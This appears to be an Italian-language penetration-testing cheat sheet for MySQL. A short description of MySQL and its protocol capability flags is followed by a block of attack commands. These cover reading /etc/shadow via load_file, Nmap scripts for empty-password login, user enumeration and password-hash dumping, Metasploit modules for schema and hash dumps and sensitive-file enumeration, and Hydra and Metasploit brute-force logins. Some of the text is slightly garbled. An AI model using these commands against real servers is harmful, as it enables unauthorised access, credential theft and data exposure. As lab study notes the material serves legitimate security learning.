MySQL è un sistema di gestione di database relazionali SQL open source sviluppato e supportato da Oracle. Un database è semplicemente una raccolta strutturata di dati organizzata per un facile utilizzo e recupero. Il sistema di database può elaborare rapidamente grandi quantità di dati con prestazioni elevate. All'interno del database, l'archiviazione dei dati viene effettuata in modo da occupare il minor spazio possibile. Il database è controllato utilizzando il linguaggio del database SQL . MySQL funziona secondo client-server principleed è composto da un server MySQL e uno o più client MySQL. Il server MySQL è l'effettivo sistema di gestione del database. Si occupa dell'archiviazione e della distribuzione dei dati. I dati vengono archiviati in tabelle con colonne, righe e tipi di dati diversi. Questi database sono spesso archiviati in un unico file con estensione file .sql, ad esempio likewordpress.sql.



Le capabilities in MySQL sono valori utilizzati nel protocollo client/server per indicare le funzionalità supportate da un client MySQL. Questi flag consentono al server di comprendere le capacità del client e di adattare il comportamento di conseguenza1.

Ecco alcuni esempi di queste capabilities:

#CLIENT_LONG_PASSWORD: Utilizza la versione migliorata dell’autenticazione con la vecchia password.
#CLIENT_FOUND_ROWS: Invia le righe trovate invece delle righe interessate nell’EOF_Packet.
#CLIENT_LONG_FLAG: Ottiene tutti i flag delle colonne.
#CLIENT_CONNECT_WITH_DB: Il nome del database (schema) può essere specificato durante la connessione nella risposta di handshake.
#CLIENT_COMPRESS: Supporta il protocollo di compressione.
#CLIENT_INTERACTIVE: Indica che si tratta di un client interattivo1.
Ad esempio, il flag CLIENT_INTERACTIVE indica che il client è interattivo, il che può influenzare il timeout della connessione1. Queste capabilities sono importanti per garantire una comunicazione corretta tra il client e il server MySQL.

Comandi MySQL:
```
> mysql -u root -p password -h 10.10.10.10
> mysql -h 192.49.51.3 -u root
show databases;
use <dbName>;
show tables;
show columns from <nameTable>;
select * from <table> where column = <column>;

MySqlShow Client
> mysqlshow -uroot -ptorba02 -h172.28.0.1

MySQL - Password Hash:Read System file:
select load_file(”/etc/shadow”);


# Nmap Script
> find /usr/share/nmap/scripts -type f -name *mysql* 2>/dev/null
> nmap -sV -p3306 192.49.51.3

# Nmap Anonymous Login:
> nmap --script=mysql-empty-password -p 3306 192.71.145.3

# Nmap - Enumerate Users:
> nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

# Nmap - Info about mysql such as if InteractiveClient **capability** is supported.
Command: nmap --script=mysql-info -p 3306 192.71.145.3

# Nmap - Enumeration Databases:
> nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

# Nmap - Enumerate Data directory of MySQL:
> nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3

# Nmap - Privilege Escalation to non admin users
> nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n selib/data/mysql-cis.audit'" -p 3306 192.71.145.3

# Nmap - Dump Hashes:
> nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3

# Nmap - Execute Query:
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 192.71.145.3








# Metasploit
Metasploit - Dump Schema:
> use auxiliary/scanner/mysql/mysql_schemadump

Metasploit - Search Writable Dirs:
> use auxiliary/scanner/mysql/mysql_writable_dirs
> set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt

Metasploit - File Readable Enum:
> use auxiliary/scanner/mysql/mysql_file_enum
> set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

Metasploit - Password Hash Dump of All Database:
> use auxiliary/scanner/mysql/mysql_hashdump

Metasploit - Bruteforce Login:
> msfconsole
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit




#### Hydra
Hydra Bruteforce
> hydra -L /usr/share/user.txt -p /unix_password.txt 10.10.10.0 mysql
> hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.0.20 -s8081 mysql

```